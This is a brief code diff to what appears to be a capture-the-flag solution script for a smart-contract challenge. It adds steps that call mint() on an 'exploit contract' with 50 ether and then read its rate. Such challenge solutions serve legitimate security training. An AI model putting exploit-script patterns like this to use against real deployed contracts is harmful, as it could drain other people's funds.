@@ -64,6 +64,19 @@ export const solve = async (exploiter: Sender, setupAddress: string): Promise<bo
         const res0 = await exploiter.viewContract(exploitContractAddress, calldata);
         console.log('TOKEN:', res0);
     }
+    {
+        const calldata = abi.simpleEncode('mint()');
+        const res0 = await exploiter.callContract(exploitContractAddress, calldata, {
+            value: '50',
+            unit: 'ether'
+        });
+        console.log('minted:', res0);
+    }
+    {
+        const calldata = abi.simpleEncode('getRate()');
+        const res0 = await exploiter.viewContract(exploitContractAddress, calldata);
+        console.log('rate:', web3.utils.hexToNumberString(res0));
+    }
     
 
     /* solve check ----------------------------------------------------- */ 
